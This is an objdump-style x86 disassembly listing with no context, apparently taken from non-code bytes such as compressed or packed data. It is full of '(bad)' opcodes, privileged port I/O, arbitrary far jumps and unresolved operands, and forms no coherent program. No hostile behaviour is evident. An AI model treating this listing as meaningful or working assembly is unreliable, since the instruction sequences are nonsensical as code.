  4288be:	add    BYTE PTR [eax],al
  4288c0:	fld    QWORD PTR [esi]
  4288c2:	push   ds
  4288c3:	xor    DWORD PTR [edx+0x27d7be34],eax
  4288c9:	out    0x1a,al
  4288cb:	mov    dl,0x5
  4288cd:	pop    ss
  4288ce:	(bad)  
  4288cf:	in     al,dx
  4288d0:	xchg   ebx,eax
  4288d1:	paddd  mm1,QWORD PTR [edi-0x27]
  4288d5:	call   DWORD PTR [edi-0x69cd0b9e]
  4288db:	icebp  
  4288dc:	mov    eax,0xdd3fa6c3
  4288e1:	mov    bh,0x1
  4288e3:	test   BYTE PTR ds:0x58790000,bl
  4288e9:	xlat   BYTE PTR ds:[ebx]
  4288ea:	xor    cl,0x40
  4288ed:	dec    ebp
  4288ee:	add    BYTE PTR [eax],al
  4288f0:	xor    DWORD PTR [edx-0x43],esi
  4288f3:	outs   dx,BYTE PTR ds:[esi]
  4288f4:	sub    BYTE PTR [ebx+0x49279a32],al
  4288fa:	xchg   BYTE PTR [eax+edx*4-0x37f50000],al
  428901:	push   0x0
  428903:	add    BYTE PTR [eax-0x36],ah
  428906:	or     eax,esi
  428908:	xchg   ecx,eax
  428909:	jns    0x42895b
  42890b:	fcmovnu st,st(3)
  42890d:	sub    cl,ch
  42890f:	add    BYTE PTR [edi+0x0],al
  428912:	add    BYTE PTR [edi+0x25],al
  428915:	pop    ebx
  428916:	add    BYTE PTR [ecx+0x26520000],dh
  42891c:	xor    eax,DWORD PTR [esi+esi*2+0x0]
  428920:	add    BYTE PTR [eax+0x20],dl
  428923:	mov    ebx,esi
  428925:	add    al,0xe8
  428927:	add    BYTE PTR [eax],al
  428929:	sbb    DWORD PTR [ebx-0x2b3ddcd8],0xffffffb7
  428930:	cmp    ecx,eax
  428932:	dec    eax
  428933:	add    BYTE PTR [eax],al
  428935:	sub    bl,BYTE PTR [ebx-0x4f]
  428938:	jecxz  0x4288d9
  42893a:	popf   
  42893b:	out    0xa7,al
  42893d:	and    ebp,DWORD PTR [esi+0x3936c1d8]
  428943:	add    eax,0x1dcdfd93
  428948:	sbb    al,0xde
  42894a:	fmulp  st(0),st
  42894c:	push   ebp
  42894d:	add    BYTE PTR [eax],al
  42894f:	adc    BYTE PTR [ebp-0x3abf42df],dl
  428955:	add    BYTE PTR [eax],al
  428957:	bound  esp,QWORD PTR [esi+0x7a]
  42895a:	aas    
  42895b:	adc    DWORD PTR [ecx-0x24],eax
  42895e:	pusha  
  42895f:	in     al,dx
  428960:	scas   eax,DWORD PTR es:[edi]
  428961:	nop
  428962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428963:	fs cli 
  428965:	and    ecx,DWORD PTR [ecx]
  428967:	xchg   ecx,eax
  428968:	jle    0x42895d
  42896a:	div    BYTE PTR [edi]
  42896c:	stos   BYTE PTR es:[edi],al
  42896d:	mov    ds:0xee724390,eax
  428972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428973:	in     eax,0x38
  428975:	add    dl,dl
  428977:	jbe    0x4289ca
  428979:	pop    ss
  42897a:	adc    DWORD PTR [ebp-0x21],0x38
  42897e:	add    al,0x7b
  428980:	add    BYTE PTR [eax],al
  428982:	jo     0x428a00
  428984:	test   al,0xcd
  428986:	es (bad) 
  428989:	push   ds
  42898a:	add    dl,BYTE PTR [edx]
  42898c:	fst    DWORD PTR [eax+ebp*1-0x68]
  428990:	push   eax
  428991:	xor    ebx,DWORD PTR [edx+0x58ebb766]
  428997:	mov    edx,0xcee1ee27
  42899c:	ret    0xa351
  42899f:	jae    0x428952
  4289a1:	xor    dh,cl
  4289a3:	cwde   
  4289a4:	in     eax,dx
  4289a5:	sub    DWORD PTR [esi],esp
  4289a7:	push   0x77
  4289a9:	mov    ds:0x8afae0bf,al
  4289ae:	jae    0x428993
  4289b0:	mov    ebx,0x95c87e
  4289b5:	add    BYTE PTR [ebp-0x6880cec7],bh
  4289bb:	push   ecx
  4289bc:	shl    BYTE PTR [eax],1
  4289be:	retf   
  4289bf:	imul   esi,ebx,0x32
  4289c2:	repnz mov al,ds:0xb57b06a3
  4289c8:	pop    edx
  4289c9:	adc    DWORD PTR [eax-0x19],edx
  4289cc:	pop    ebx
  4289cd:	scas   al,BYTE PTR es:[edi]
  4289ce:	jo     0x428993
  4289d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4289d1:	push   ds
  4289d2:	xchg   edi,eax
  4289d3:	push   ebx
  4289d4:	and    ebx,ebx
  4289d6:	mov    BYTE PTR [ecx+0x0],al
  4289d9:	add    BYTE PTR [esi+0x5d1a19ac],ch
  4289df:	pusha  
  4289e0:	add    eax,0xfe5f59e8
  4289e5:	(bad)  
  4289e6:	jp     0x428a36
  4289e8:	jl     0x4289b1
  4289ea:	xor    BYTE PTR [ebx+edx*2+0x0],al
  4289ee:	add    BYTE PTR [ebx+eax*1-0x1e48c1fb],ah
  4289f5:	outs   dx,DWORD PTR ds:[esi]
  4289f6:	pop    esp
  4289f7:	pushf  
  4289f8:	test   eax,0x4e978333
  4289fd:	sar    BYTE PTR [ebx+0x0],0x0
  428a01:	and    bl,ah
  428a03:	pop    esi
  428a04:	jmp    0x4289ed
  428a06:	jbe    0x428a66
  428a08:	sub    eax,0xe4bcba07
  428a0d:	and    esp,DWORD PTR [ebp+0x7d]
  428a10:	cs adc dl,bh
  428a13:	cs cld 
  428a15:	sub    BYTE PTR [esi-0x7f],bl
  428a18:	jbe    0x428a04
  428a1a:	sti    
  428a1b:	jecxz  0x428a5b
  428a1d:	inc    edi
  428a1e:	ror    DWORD PTR [ecx],1
  428a20:	js     0x428a6a
  428a22:	sub    al,BYTE PTR [eax]
  428a24:	add    BYTE PTR [edi+0x1c4cbec6],dh
  428a2a:	add    BYTE PTR [eax],al
  428a2c:	or     eax,edi
  428a2e:	add    edx,DWORD PTR [ebx+0x3a2ef5a8]
  428a34:	sub    BYTE PTR [ecx-0x58848ed],dh
  428a3a:	cli    
  428a3b:	adc    eax,0x40f23402
  428a40:	repnz add BYTE PTR [eax],al
  428a43:	inc    ebp
  428a44:	pop    ds
  428a45:	push   ecx
  428a46:	xchg   ebx,eax
  428a47:	aaa    
  428a48:	sbb    dh,dl
  428a4a:	jp     0x428a2d
  428a4c:	fwait
  428a4d:	and    al,0x9f
  428a4f:	add    esp,esi
  428a51:	ss cld 
  428a53:	push   edx
  428a54:	imul   ebx,DWORD PTR [esp+edi*8-0x6a],0x15
  428a59:	pop    ecx
  428a5a:	pop    ebp
  428a5b:	push   eax
  428a5c:	nop
  428a5d:	push   esp
  428a5e:	push   ds
  428a5f:	mov    DWORD PTR [edi-0x50],esp
  428a62:	aas    
  428a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428a64:	mov    edi,0xf8fd6409
  428a69:	and    eax,DWORD PTR [eax]
  428a6b:	ins    BYTE PTR es:[edi],dx
  428a6c:	add    BYTE PTR [eax],al
  428a6e:	(bad)  
  428a6f:	mov    ds:0x6752f367,eax
  428a74:	popa   
  428a75:	pushf  
  428a76:	or     bl,BYTE PTR [ebx+0x75f89d3]
  428a7c:	sub    ch,BYTE PTR [ebp-0x41]
  428a7f:	in     eax,0x38
  428a81:	mov    eax,0x39b34f90
  428a86:	xchg   ebp,eax
  428a87:	adc    eax,0x2c98d570
  428a8c:	daa    
  428a8d:	pop    esp
  428a8e:	jbe    0x428abb
  428a90:	leave  
  428a91:	lea    edi,[edi]
  428a93:	xchg   edi,eax
  428a94:	push   ds
  428a95:	sbb    esp,ecx
  428a97:	std    
  428a98:	and    DWORD PTR [ebp-0x1b9af865],ecx
  428a9e:	sti    
  428a9f:	les    ecx,FWORD PTR [eax]
  428aa1:	add    BYTE PTR [eax],al
  428aa3:	lods   al,BYTE PTR ds:[esi]
  428aa4:	rcr    BYTE PTR [esi-0x49],1
  428aa7:	lock sub al,0xdd
  428aaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428aab:	bound  eax,QWORD PTR [esi]
  428aad:	test   al,0x4e
  428aaf:	mov    eax,ds:0x2cac9539
  428ab4:	jge    0x428a60
  428ab6:	mov    ecx,esi
  428ab8:	pop    eax
  428ab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428aba:	jmp    0xd9a93dec
  428abf:	(bad)  
  428ac0:	mov    al,ds:0x8998134b
  428ac5:	repnz fidivr DWORD PTR [ebx-0x75]
  428aca:	sbb    eax,0x5b4d902c
  428acf:	sub    DWORD PTR [esi-0x1f9ba47d],esi
  428ad5:	or     eax,0x107122c9
  428ada:	push   eax
  428adb:	fdivr  DWORD PTR [edx+0x1c40]
  428ae1:	xchg   ebx,eax
  428ae2:	(bad)  [edi]
  428ae4:	inc    edx
  428ae5:	popf   
  428ae6:	arpl   WORD PTR [edx+0x4],ax
  428ae9:	xchg   ecx,eax
  428aea:	add    BYTE PTR [eax],al
  428aec:	out    dx,eax
  428aed:	adc    edx,esi
  428aef:	into   
  428af0:	out    dx,al
  428af1:	xor    bl,BYTE PTR [ebx+0x30]
  428af4:	mul    edx
  428af6:	sub    BYTE PTR [ebx],cl
  428af8:	lods   eax,DWORD PTR ds:[esi]
  428af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428afa:	je     0x428a90
  428afc:	(bad)  
  428afd:	(bad)  
  428afe:	std    
  428aff:	inc    edi
  428b00:	stos   DWORD PTR es:[edi],eax
  428b01:	dec    eax
  428b02:	adc    BYTE PTR [eax],al
  428b04:	add    ch,dl
  428b06:	add    DWORD PTR [eax+0xf04052],edx
  428b0c:	add    BYTE PTR [ecx],al
  428b0e:	lds    ebx,FWORD PTR [esi]
  428b10:	loopne 0x428b01
  428b12:	out    0xdf,al
  428b14:	jnp    0x428b03
  428b16:	(bad)  
  428b17:	sti    
  428b18:	sub    eax,0x3fcaf007
  428b1d:	(bad)  
  428b1e:	lea    edi,[esi-0x3a]
  428b21:	loopne 0x428adf
  428b23:	ret    
  428b24:	sub    al,0xbb
  428b26:	push   ecx
  428b27:	sbb    eax,0x51215be6
  428b2c:	adc    ah,cl
  428b2e:	xor    BYTE PTR [eax],al
  428b30:	add    BYTE PTR [ebp+0x24],bl
  428b33:	mov    cl,0xdf
  428b35:	jge    0x428ad8
  428b37:	mov    edx,0x23036291
  428b3c:	imul   edx,ebx,0x930cc3
  428b42:	add    BYTE PTR ds:0xadc4e598,ch
  428b48:	add    BYTE PTR [eax],al
  428b4a:	lods   eax,DWORD PTR ds:[esi]
  428b4b:	push   esi
  428b4c:	pop    ds
  428b4d:	div    ecx
  428b4f:	sub    al,0xa2
  428b51:	or     BYTE PTR [eax+0x0],ah
  428b54:	add    BYTE PTR [ecx-0x11d3ca4d],dl
  428b5a:	xchg   edi,eax
  428b5b:	pop    esp
  428b5c:	sub    eax,0x3841d5e2
  428b61:	jmp    0x428b5b
  428b63:	shr    BYTE PTR [ebx+0x0],0x0
  428b67:	and    cl,BYTE PTR [edx-0x4f]
  428b6a:	xor    eax,0x3205c9bf
  428b6f:	in     al,0x4b
  428b71:	vmread DWORD PTR [esi-0x58],ebp
  428b75:	or     BYTE PTR [edi+0x0],ch
  428b78:	add    BYTE PTR [edx],ch
  428b7a:	dec    esp
  428b7b:	sahf   
  428b7c:	add    BYTE PTR [eax],al
  428b7e:	add    esi,DWORD PTR [edi-0x6f9a32fe]
  428b84:	lock mov ebx,eax
  428b87:	jae    0x428bfa
  428b89:	xchg   ebx,eax
  428b8a:	pop    eax
  428b8b:	jb     0x428bcd
  428b8d:	into   
  428b8e:	add    BYTE PTR [eax],al
  428b90:	call   0x6b:0x2eabbd64
  428b97:	mov    ah,0x0
  428b99:	add    BYTE PTR [eax+0x88085c],dh
  428b9f:	add    cl,bh
  428ba1:	test   al,0x79
  428ba3:	inc    ebp
  428ba4:	adc    eax,0x1fc8
  428ba9:	xchg   ecx,eax
  428baa:	add    al,0x23
  428bac:	add    BYTE PTR [eax],al
  428bae:	aaa    
  428baf:	and    BYTE PTR [ebx+ebp*4+0x42be0000],cl
  428bb6:	rcl    ebx,1
  428bb8:	div    ecx
  428bba:	cs mov dh,0x84
  428bbd:	dec    esi
  428bbe:	add    BYTE PTR [eax],al
  428bc0:	outs   dx,BYTE PTR ds:[esi]
  428bc1:	fistp  QWORD PTR [ecx+eiz*8-0x1a]
  428bc5:	enter  0x54,0x0
  428bc9:	push   eax
  428bca:	clc    
  428bcb:	mov    ch,0x29
  428bcd:	outs   dx,BYTE PTR ds:[esi]
  428bce:	fs dec eax
  428bd0:	jp     0x428bd2
  428bd2:	add    BYTE PTR [eax-0x25],dh
  428bd5:	jge    0x428c03
  428bd7:	imul   eax,DWORD PTR [ecx],0x220f9b72
  428bdd:	imul   ebx,DWORD PTR [edi-0x76],0xffffffbe
  428be1:	jmp    0x783924a0
  428be6:	sub    DWORD PTR [ecx-0x5c],0x7b
  428bea:	adc    eax,0xde00ae
  428bef:	add    BYTE PTR [ebx],cl
  428bf1:	adc    BYTE PTR [ebp-0x2d9f0000],0x4e
  428bf8:	cmp    edx,DWORD PTR [esi-0x9]
  428bfb:	mov    esi,0x77f32b57
  428c00:	aad    0x78
  428c02:	mov    ds:0x6c67169d,eax
  428c07:	retf   
  428c08:	les    ebx,FWORD PTR [ebx+0x19cd0000]
  428c0e:	mov    bl,0x97
  428c10:	lock dec edx
  428c12:	ds pop ss
  428c14:	test   DWORD PTR [eax-0x12],edx
  428c17:	or     al,0x1a
  428c19:	add    BYTE PTR [eax],al
  428c1b:	jecxz  0x428bed
  428c1d:	mov    al,ds:0x49b63196
  428c22:	mov    ?,WORD PTR [eax]
  428c24:	ja     0x428c53
  428c26:	xchg   ecx,eax
  428c27:	sar    DWORD PTR [ebx-0x5f],cl
  428c2a:	and    al,0x2
  428c2c:	xor    al,0x56
  428c2e:	mov    ebx,0xcd68287f
  428c33:	je     0x428c37
  428c35:	adc    DWORD PTR [eax+0x2000002c],ecx
  428c3b:	cwde   
  428c3c:	ja     0x428c72
  428c3e:	jmp    0x4a1a:0x83fd3f85
  428c45:	jbe    0x428c85
  428c47:	out    0xe2,eax
  428c49:	push   ds
  428c4a:	add    ch,bh
  428c4c:	xor    al,0xdb
  428c4f:	jne    0x428c5f
  428c51:	and    esp,DWORD PTR [eax-0x28]
  428c54:	imul   ebp,DWORD PTR [edi],0x63
  428c57:	das    
  428c58:	mov    ecx,0x4a6867ef
  428c5d:	cld    
  428c5e:	loope  0x428c98
  428c60:	shl    BYTE PTR [ecx-0x33cf53c5],1
  428c66:	xor    al,0x0
  428c68:	add    cl,dh
  428c6a:	xchg   DWORD PTR [eax+0x71ed4281],edi
  428c70:	jmp    0x42a075
  428c75:	push   ebx
  428c76:	xor    cl,BYTE PTR [edi-0x48c6b9cd]
  428c7c:	jl     0x428c41
  428c7e:	dec    ecx
  428c7f:	mov    esp,0x495d4d77
  428c84:	push   DWORD PTR [edx]
  428c86:	cmp    DWORD PTR ds:0xb080bcb8,eax
  428c8c:	add    BYTE PTR [eax],al
  428c8e:	xor    BYTE PTR [ebx+edx*4+0x37af212f],ah
  428c95:	inc    ecx
  428c96:	lds    esi,FWORD PTR [edi+0x3068f1e5]
  428c9c:	not    DWORD PTR [esi+0x7880e1fe]
  428ca2:	add    BYTE PTR [eax],al
  428ca4:	test   al,0x50
  428ca6:	xchg   esi,eax
  428ca7:	jbe    0x428cb6
  428ca9:	pop    ecx
  428caa:	and    DWORD PTR [esi],eax
  428cac:	inc    edx
  428cad:	mov    eax,ds:0x31ed72f2
  428cb2:	adc    ah,al
  428cb4:	add    cl,ah
  428cb6:	add    BYTE PTR [eax],al
  428cb8:	imul   edx,DWORD PTR ss:[eax],0xc3ed72e6
  428cbf:	sub    al,0xc2
  428cc1:	inc    ebp
  428cc2:	push   cs
  428cc3:	mov    esi,0xec13a999
  428cc8:	div    DWORD PTR [ecx-0x517dd03b]
  428cce:	loope  0x428c90
  428cd0:	ins    DWORD PTR es:[edi],dx
  428cd1:	add    BYTE PTR [eax],al
  428cd3:	std    
  428cd4:	jb     0x428c6b
  428cd6:	inc    ebx
  428cd7:	xor    al,0x45
  428cd9:	ret    0x3073
  428cdc:	xchg   esi,eax
  428cdd:	sbb    DWORD PTR [ecx+0x79],edi
  428ce0:	shr    DWORD PTR [edi+edx*8+0x67b1e37],1
  428ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428ce8:	ins    DWORD PTR es:[edi],dx
  428ce9:	xor    eax,0x1c3b61b3
  428cee:	jp     0x428c96
  428cf0:	js     0x428d2b
  428cf2:	dec    esp
  428cf3:	rol    BYTE PTR [eax],1
  428cf5:	add    BYTE PTR [ebp+0x3f683553],cl
  428cfb:	inc    ebx
  428cfc:	jl     0x428d06
  428cfe:	xchg   edx,eax
  428cff:	add    BYTE PTR [eax],al
  428d01:	lods   al,BYTE PTR ds:[esi]
  428d02:	cmp    cl,BYTE PTR [ebx+0x63ee6e41]
  428d08:	mov    ah,0xa7
  428d0a:	or     bh,BYTE PTR [ebp-0x1584c2aa]
  428d10:	iret   
  428d11:	out    0xee,eax
  428d13:	pop    eax
  428d14:	dec    ecx
  428d15:	imul   ebp,DWORD PTR [ebp+0x2b],0xffffff8b
  428d19:	les    ecx,FWORD PTR [eax+eax*1+0x0]
  428d1d:	mov    al,ds:0xf5603449
  428d23:	scas   al,BYTE PTR es:[edi]
  428d24:	lahf   
  428d25:	sahf   
  428d26:	sbb    eax,0x321ce924
  428d2b:	mov    DWORD PTR [edx+0x45],ebx
  428d2e:	add    eax,0xf1c8ce5d
  428d33:	add    BYTE PTR [eax],al
  428d35:	cmp    eax,0x65cfe995
  428d3a:	ds push eax
  428d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d3d:	in     al,0xeb
  428d3f:	sbb    BYTE PTR [eax-0x76c6f167],dl
  428d45:	(bad)  
  428d46:	push   esi
  428d47:	mov    bl,0xd6
  428d49:	xchg   ebp,eax
  428d4a:	ror    DWORD PTR [ebp-0x46],0x5a
  428d4e:	stos   DWORD PTR es:[edi],eax
  428d4f:	fidivr DWORD PTR [eax+0x79]
  428d52:	loopne 0x428db5
  428d54:	loop   0x428ce6
  428d56:	push   ebp
  428d57:	cmp    BYTE PTR [ebp+0x1b],ah
  428d5a:	dec    eax
  428d5b:	scas   al,BYTE PTR es:[edi]
  428d5c:	add    BYTE PTR [eax],al
  428d5e:	(bad)  
  428d5f:	sbb    eax,0x339e195a
  428d64:	jb     0x428d0a
  428d66:	inc    esi
  428d67:	jecxz  0x428dd0
  428d69:	jne    0x428db5
  428d6b:	pcmpgtd mm4,QWORD PTR [ebx]
  428d6e:	int    0x21
  428d70:	dec    ebp
  428d71:	xor    eax,0x46724636
  428d76:	mov    fs,WORD PTR ds:0xf18b9f76
  428d7c:	lahf   
  428d7d:	pop    edx
  428d7e:	cs xchg edi,eax
  428d80:	adc    al,0xee
  428d82:	xchg   edi,eax
  428d83:	dec    edx
  428d84:	fisttp QWORD PTR [edx]
  428d86:	nop
  428d87:	in     eax,dx
  428d88:	add    ecx,edx
  428d8a:	jae    0x428d7e
  428d8c:	jecxz  0x428d91
  428d8e:	dec    ebx
  428d8f:	ss (bad) 
  428d92:	mov    ebp,0x75f25cd4
  428d97:	test   eax,0x618c27
  428d9c:	add    BYTE PTR [ecx],al
  428d9e:	imul   ebp,DWORD PTR [ebx+0x13e3ca99],0x953c9f07
  428da8:	loopne 0x428de5
  428daa:	xlat   BYTE PTR ds:[ebx]
  428dab:	jg     0x428de1
  428dad:	fdiv   st(0),st
  428daf:	pop    edi
  428db0:	jae    0x428dcc
  428db2:	xor    BYTE PTR [ebx-0x6b],dh
  428db5:	arpl   WORD PTR [edx-0x365ea01c],ax
  428dbb:	add    eax,0xae3ec3aa
  428dc0:	dec    ebx
  428dc1:	outs   dx,BYTE PTR ds:[esi]
  428dc2:	pop    ebp
  428dc3:	add    eax,0xfe12342d
  428dc8:	(bad)  
  428dc9:	std    
  428dca:	mov    WORD PTR [ecx+0x0],?
  428dcd:	add    BYTE PTR [edx-0x36],dl
  428dd0:	or     ebx,DWORD PTR [ecx]
  428dd2:	push   es
  428dd3:	pop    edi
  428dd4:	xor    eax,0x2b65877f
  428dd9:	pop    ecx
  428dda:	xchg   BYTE PTR [ecx-0x26],ah
  428ddd:	or     BYTE PTR [ebx+0x5e1117dd],0xb3
  428de4:	outs   dx,DWORD PTR ds:[esi]
  428de5:	mov    bh,0xc1
  428de7:	inc    edx
  428de8:	add    esp,DWORD PTR [eax+0x7c]
  428deb:	loope  0x428e29
  428ded:	fs push esi
  428def:	in     al,0xfe
  428df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428df2:	sti    
  428df3:	(bad)  
  428df4:	rol    DWORD PTR [eax],cl
  428df6:	add    BYTE PTR [eax-0x7b],bl
  428df9:	or     dl,BYTE PTR [eax-0x61]
  428dfc:	jns    0x428e22
  428dfe:	pop    edi
  428dff:	xchg   ebx,eax
  428e00:	mov    ebx,DWORD PTR [esi]
  428e02:	xchg   ebx,ebx
  428e04:	call   0x39b6:0x8fbc2e19
  428e0b:	push   cs
  428e0c:	push   ss
  428e0d:	shl    al,1
  428e0f:	enter  0x18,0x0
  428e13:	fcom   DWORD PTR [eax]
  428e15:	mov    dl,0x98
  428e17:	les    edx,FWORD PTR [ebp+0x0]
  428e1a:	add    BYTE PTR [edx+eiz*2+0x3b290000],cl
  428e21:	jns    0x428e56
  428e23:	adc    eax,ecx
  428e25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e26:	and    BYTE PTR [edi],ah
  428e28:	inc    eax
  428e29:	mov    bh,0x0
  428e2b:	add    BYTE PTR [ebx+0x36],ch
  428e2e:	fisub  WORD PTR [edx+0x2c21cbac]
  428e34:	in     al,dx
  428e35:	loope  0x428dde
  428e37:	(bad)  
  428e38:	cmp    eax,0x15bb4732
  428e3d:	push   cs
  428e3e:	adc    al,0x6f
  428e40:	ins    DWORD PTR es:[edi],dx
  428e41:	xor    BYTE PTR [edi-0x3c230000],0x77
  428e48:	test   eax,0x279bc7a2
  428e4d:	xor    DWORD PTR [edx],edi
  428e4f:	push   0x70
  428e51:	test   BYTE PTR [eax+eax*1],cl
  428e54:	add    BYTE PTR [ebp+0x2c],dl
  428e57:	out    0xd1,eax
  428e59:	push   cs
  428e5a:	or     edx,DWORD PTR [esi+0x2820f4f]
  428e60:	out    dx,al
  428e61:	sub    eax,0xcc08a8
  428e66:	add    ah,al
  428e68:	add    DWORD PTR [eax],0x74c900
  428e6e:	xchg   BYTE PTR [eax],al
  428e70:	add    BYTE PTR [ebx-0x3da411cd],cl
  428e76:	push   esi
  428e77:	(bad)  
  428e78:	shr    DWORD PTR [esi-0x7c],cl
  428e7b:	inc    edx
  428e7c:	add    BYTE PTR [eax],al
  428e7e:	jae    0x428e3d
  428e80:	mov    ds:0x34f8d66,eax
  428e85:	push   ecx
  428e86:	add    eax,0x4be79cfd
  428e8b:	test   DWORD PTR [ecx-0x3c],esp
  428e8e:	imul   eax,DWORD PTR [eax],0x1304500
  428e94:	pop    ds
  428e95:	add    eax,0x641f0570
  428e9a:	adc    DWORD PTR ds:0xd52cde25,ebp
  428ea0:	cwde   
  428ea1:	sub    eax,0x6184a09d
  428ea6:	add    BYTE PTR [eax],al
  428ea8:	mov    ah,0xff
  428eaa:	mov    eax,0xcef0b2ea
  428eaf:	xor    eax,DWORD PTR ds:[ebx+0x9204f5]
  428eb6:	add    al,ah
  428eb8:	sbb    DWORD PTR [ebp+0x40],esi
  428ebb:	inc    BYTE PTR [eax]
  428ebd:	add    BYTE PTR [edx-0x77],al
  428ec0:	inc    ecx
  428ec1:	dec    ax
  428ec3:	das    
  428ec4:	add    BYTE PTR [eax],al
  428ec6:	xchg   edi,eax
  428ec7:	inc    edx
  428ec8:	ja     0x428ee9
  428eca:	lods   eax,DWORD PTR ds:[esi]
  428ecb:	(bad)  
  428ecc:	sub    al,0xc3
  428ece:	js     0x428f4c
  428ed0:	rcr    BYTE PTR [esi],0x0
  428ed3:	add    BYTE PTR [edx-0x7d],ch
  428ed6:	push   cs
  428ed7:	leave  
  428ed8:	sub    al,0xd6
  428eda:	aas    
  428edb:	test   DWORD PTR ds:0x82dd91d2,0x1063b9b8
  428ee5:	mov    dh,BYTE PTR [esi+0x43]
  428ee8:	pop    eax
  428ee9:	or     DWORD PTR [edx-0x18],ebp
  428eec:	outs   dx,DWORD PTR ds:[esi]
  428eed:	mov    dl,dh
  428eef:	add    BYTE PTR [eax],al
  428ef1:	cwde   
  428ef2:	sub    edx,DWORD PTR [eax-0x69]
  428ef5:	push   ecx
  428ef6:	lahf   
  428ef7:	ins    DWORD PTR es:[edi],dx
  428ef8:	jmp    0xbb5c239c
  428efd:	stos   BYTE PTR es:[edi],al
  428efe:	lea    edx,[ebp+edi*8-0x2e8b4602]
  428f05:	add    ecx,ecx
  428f07:	out    dx,al
  428f08:	jecxz  0x428f0f
  428f0a:	popf   
  428f0b:	stos   DWORD PTR es:[edi],eax
  428f0c:	xchg   BYTE PTR ds:0x3afe439a,dh
  428f12:	or     ah,BYTE PTR [eax]
  428f14:	dec    ebx
  428f15:	xchg   ebx,eax
  428f16:	xchg   edi,eax
  428f17:	(bad)  
  428f18:	sbb    eax,0x8da4057a
  428f1d:	(bad)  
  428f1e:	stc    
  428f1f:	add    BYTE PTR [eax],al
  428f21:	inc    ecx
  428f22:	jle    0x428f02
  428f24:	out    0xb7,eax
  428f26:	(bad)  
  428f27:	push   cs
  428f28:	loop   0x428eca
  428f2a:	cmp    al,0xdc
  428f2c:	dec    ecx
  428f2d:	out    dx,eax
  428f2e:	push   es
  428f2f:	xor    ah,bh
  428f31:	fdivr  QWORD PTR [esi+0x50]
  428f34:	pop    ebp
  428f35:	push   esp
  428f36:	enter  0xf7,0x0
  428f3a:	movlps QWORD PTR [eax-0x44],xmm3
  428f3e:	int3   
  428f3f:	mov    ds:0x16070000,al
  428f44:	and    bl,BYTE PTR [edi-0x4f402a99]
  428f4a:	mul    BYTE PTR [eax+0x94082]
  428f50:	add    bh,dh
  428f52:	xchg   edi,eax
  428f53:	not    DWORD PTR [eax+ebx*8-0x13]
  428f57:	fwait
  428f58:	mov    WORD PTR [edx+0x0],ss
  428f5b:	add    BYTE PTR [edi],bh
  428f5d:	or     DWORD PTR [ebp+esi*4+0x4cbb9aef],esp
  428f64:	pop    ecx
  428f65:	add    BYTE PTR [eax],al
  428f67:	(bad)  
  428f69:	mov    ecx,0xc64c
  428f6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f6f:	retf   0xc37c
  428f72:	in     eax,dx
  428f73:	cli    
  428f74:	dec    edx
  428f75:	ins    DWORD PTR es:[edi],dx
  428f76:	cmp    BYTE PTR [ebx+edi*8],cl
  428f79:	add    BYTE PTR [eax],al
  428f7b:	push   ebx
  428f7c:	and    eax,0x61225e0b
  428f81:	add    DWORD PTR [edx],0x2
  428f84:	das    
  428f85:	inc    esp
  428f86:	outs   dx,DWORD PTR ds:[esi]
  428f87:	add    BYTE PTR [eax],al
  428f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f8a:	xchg   ebp,eax
  428f8b:	aaa    
  428f8c:	mov    eax,ds:0x92798732
  428f91:	adc    ebp,DWORD PTR [edi]
  428f93:	add    al,0xc6
  428f95:	add    BYTE PTR [eax],al
  428f97:	cmp    edx,esi
  428f99:	enter  0x5f,0x0
  428f9d:	push   es
  428f9e:	mov    bh,0x72
  428fa0:	sahf   
  428fa1:	pop    ebp
  428fa2:	ficom  DWORD PTR [esi+0x6cc0]
  428fa8:	imul   ecx,DWORD PTR [esi],0x109e4df7
  428fae:	popa   
  428faf:	sbb    cl,BYTE PTR [edi+0x14]
  428fb2:	outs   dx,DWORD PTR ds:[esi]
  428fb3:	daa    
  428fb4:	(bad)  
  428fb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428fb6:	xor    DWORD PTR [ecx+0x5d],esp
  428fb9:	mov    dl,0xdc
  428fbb:	pop    esp
  428fbc:	fisttp DWORD PTR [ebp+0x50c9899c]
  428fc2:	dec    ecx
  428fc3:	adc    eax,0x7a5e36d8
  428fc8:	xor    al,al
  428fca:	add    BYTE PTR ss:[eax],al
  428fcd:	mov    al,0xaf
  428fcf:	jmp    0xe6:0xc471f8c1
  428fd6:	add    BYTE PTR [edi],cl
  428fd8:	sub    BYTE PTR [edi+0xd0d2e07],cl
  428fde:	mov    edi,esp
  428fe0:	mov    esi,0xfb498af
  428fe5:	pop    ecx
  428fe6:	mov    ch,0xe7
  428fe8:	dec    ebx
  428fe9:	div    eax
  428feb:	mov    cl,0x53
  428fed:	retf   0x9e61
  428ff0:	mov    bl,BYTE PTR [edi+edx*4+0x13]
  428ff4:	sub    BYTE PTR [esi+0x33],dl
  428ff7:	adc    bl,BYTE PTR [esi+0x6b]
  428ffa:	imul   DWORD PTR [edi+ecx*1]
  428ffd:	popf   
  428ffe:	sub    al,0x24
  429000:	adc    dl,ah
  429002:	aam    0xd2
  429004:	or     al,0x88
  429006:	add    BYTE PTR [eax],al
  429008:	in     al,0x12
  42900a:	dec    ebx
  42900b:	mov    ds:0x80cc19,al
  429010:	add    BYTE PTR [eax],dh
  429012:	psubd  mm0,QWORD PTR ds:0xef537498
  429019:	sti    
  42901a:	(bad)  
  42901c:	shr    BYTE PTR [ebp+0x0],0x0
  429020:	add    BYTE PTR [ebx],dh
  429022:	add    BYTE PTR [eax],al
  429024:	test   eax,0xdb4d60d9
  429029:	mov    ch,0x64
  42902b:	fs mov dl,0x89
  42902e:	shr    DWORD PTR [ebx],0xfd
  429031:	xor    al,0x24
  429033:	xchg   BYTE PTR [eax+0x249b8b49],bl
